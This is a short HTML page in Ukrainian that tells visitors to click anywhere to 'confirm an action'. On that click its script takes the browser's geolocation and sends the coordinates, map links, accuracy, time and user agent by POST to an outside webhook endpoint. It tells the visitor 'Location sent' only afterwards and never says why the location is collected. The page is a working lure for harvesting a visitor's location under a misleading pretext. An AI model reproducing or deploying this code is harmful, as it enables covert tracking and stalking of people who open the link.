<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<title>Send location</title>
</head>
<body>

<p>Натисніть будь-де на сторінці, щоб підтвердити дію</p>

<script>
function sendGeoOnce() {
  document.removeEventListener("click", sendGeoOnce);

  if (!navigator.geolocation) {
    alert("Геолокація не підтримується");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      const googleMap = "https://www.google.com/maps?q=" + lat + "," + lon;
      const openStreetMap =
        "https://www.openstreetmap.org/?mlat=" + lat +
        "&mlon=" + lon +
        "#map=17/" + lat + "/" + lon;

      const payload = {
        lat: lat,
        lon: lon,
        google_map: googleMap,
        openstreet_map: openStreetMap,
        accuracy: pos.coords.accuracy,
        time: new Date().toISOString(),
        ua: navigator.userAgent
      };

      fetch("https://app.hooklistener.com/w/my-first-endpoint-ph72/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });

      alert("Локацію відправлено");
    },
    (err) => {
      alert("Помилка геолокації: " + err.message);
    }
  );
}

document.addEventListener("click", sendGeoOnce);
</script>

</body>
</html>
